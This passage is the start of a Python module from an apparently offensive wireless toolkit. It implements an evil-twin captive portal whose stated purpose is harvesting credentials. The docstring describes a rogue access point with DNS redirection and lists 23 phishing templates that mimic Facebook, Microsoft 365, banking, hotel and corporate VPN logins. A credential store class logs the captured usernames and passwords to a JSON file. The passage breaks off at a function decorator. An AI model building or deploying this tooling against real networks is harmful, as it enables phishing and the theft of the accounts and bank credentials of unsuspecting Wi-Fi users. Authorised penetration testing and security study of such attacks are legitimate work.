#!/usr/bin/env python3
# Author: Andre Henrique (@mrhenrike) | Uniao Geek - https://github.com/Uniao-Geek
"""Captive Portal Engine - evil twin with credential-harvesting web portal.

Full-stack captive portal for social engineering Wi-Fi attacks:
  - hostapd (soft AP) + dnsmasq (DHCP + DNS redirect)
  - Built-in HTTP server serving customizable landing page templates
  - Credential capture and logging
  - Optional real-time password verification against captured WPA handshake
    via hashcat inline check

23 built-in templates with automatic language detection (11 languages):
  - Captive portals: router admin, ISP, Google/Apple, corporate 802.1X,
    MFA, firmware update, hotel, airport, coffee shop, university,
    shopping mall, public library
  - Social media: Facebook, Instagram, X (Twitter), LinkedIn
  - Services: Microsoft 365, Netflix, cloud storage, VPN, WhatsApp Web,
    banking update

All templates auto-detect browser language (en, pt, es, fr, de, it,
ja, zh, ko, ru, ar) with en-US fallback and RTL support for Arabic.

Requires: hostapd, dnsmasq, Python 3.7+. Optional: hashcat.

Version: 2.0.0
"""


import http.server
import json
import logging
import os
import shutil
import socketserver
import subprocess
import threading
import time
import urllib.parse
from typing import Dict, List, Optional

from wirelessxpl.core.exploit import *
from wirelessxpl.core.os_guard import OSRequirement, requires_os
from wirelessxpl.modules.generic.wifi._disclaimer import require_authorised_lab

logger = logging.getLogger(__name__)

_TEMPLATE_DIR = os.path.join(os.path.dirname(__file__), "..", "..", "..", "resources", "captive_templates")

_DEFAULT_TEMPLATES = {
    # --- Captive Portals (Wi-Fi) ---
    "router_admin": "Router administration login (Wi-Fi password capture)",
    "isp_login": "ISP / carrier Wi-Fi hotspot login",
    "google_wifi": "Google / Android captive portal check redirect",
    "apple_captive": "Apple CNA (Captive Network Assistant) portal",
    "corporate_8021x": "Corporate 802.1X Enterprise login (AD credentials)",
    "mfa_portal": "Multi-factor authentication portal (user + pass + OTP)",
    "firmware_update": "Router firmware update page (Wi-Fi password capture)",
    "hotel_wifi": "Luxury hotel Wi-Fi portal (room + last name)",
    "airport_wifi": "Airport free Wi-Fi portal (email + access code)",
    "coffee_shop": "Coffee shop / cafe Wi-Fi portal",
    "university_campus": "University / campus network login (student ID)",
    "shopping_mall": "Shopping mall free Wi-Fi portal",
    "public_library": "Public library Wi-Fi (library card + PIN)",
    # --- Social Media ---
    "facebook": "Facebook login page",
    "instagram": "Instagram login page",
    "twitter_x": "X (Twitter) login page",
    "linkedin": "LinkedIn professional login page",
    # --- Services ---
    "microsoft_365": "Microsoft 365 / Outlook sign-in page",
    "netflix": "Netflix sign-in page",
    "cloud_storage": "Google Drive / cloud storage login",
    "vpn_login": "Corporate VPN secure access portal",
    "whatsapp_web": "WhatsApp Web verification page",
    "banking_update": "Banking security verification page",
}


def _which(binary: str) -> str | None:
    return shutil.which(binary)


class _CredentialStore:
    """Thread-safe credential storage."""

    def __init__(self, log_dir: str):
        self._lock = threading.Lock()
        self._creds: list[dict] = []
        self._log_path = os.path.join(log_dir, "captured_credentials.json")
        os.makedirs(log_dir, exist_ok=True)

    def add(self, data: dict) -> None:
        data["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%S")
        with self._lock:
            self._creds.append(data)
            try:
                with open(self._log_path, "w") as f:
                    json.dump(self._creds, f, indent=2)
            except OSError as exc:
                logger.error("Failed to write credentials: %s", exc)

    @property
    def count(self) -> int:
        with self._lock:
            return len(self._creds)

    @property
    def all(self) -> list[dict]:
        with self._lock:
            return list(self._creds)


@requires_os(OSRequirement.LINUX_ONLY)
